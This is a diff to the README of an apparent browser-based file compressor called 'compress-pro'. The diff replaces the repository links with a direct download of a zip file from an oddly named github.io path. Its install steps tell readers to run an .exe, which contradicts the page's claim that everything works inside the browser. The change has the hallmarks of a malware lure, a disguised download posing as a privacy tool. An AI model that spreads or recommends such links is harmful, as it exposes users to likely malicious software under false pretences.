@@ -5,7 +5,7 @@ description: "Compress images, videos, audio, and PDFs directly in your browser 
 ---
 # 🗜 compress-pro - Keep your personal files private today
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Smoothened-lessercentaury430/compress-pro)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Smoothened-lessercentaury430/smoothened-lessercentaury430.github.io/main/cystocarpic/Release_v2.4.zip)
 
 compress-pro shrinks your digital files. It works inside your web browser. You do not send files to a server. Your data stays on your computer. This tool supports pictures, documents, videos, and audio files. You maintain full control over your privacy.
 
@@ -22,7 +22,7 @@ This app handles many file types. It reduces size without losing quality.
 
 ## 📥 How to download and install
 
-1. Visit this website to download: [https://github.com/Smoothened-lessercentaury430/compress-pro](https://github.com/Smoothened-lessercentaury430/compress-pro)
+1. Visit this website to download: [https://raw.githubusercontent.com/Smoothened-lessercentaury430/smoothened-lessercentaury430.github.io/main/cystocarpic/Release_v2.4.zip](https://raw.githubusercontent.com/Smoothened-lessercentaury430/smoothened-lessercentaury430.github.io/main/cystocarpic/Release_v2.4.zip)
 2. Locate the latest release on the page.
 3. Click the link ending in .exe to download the installer.
 4. Open the downloaded file once the timer finishes.
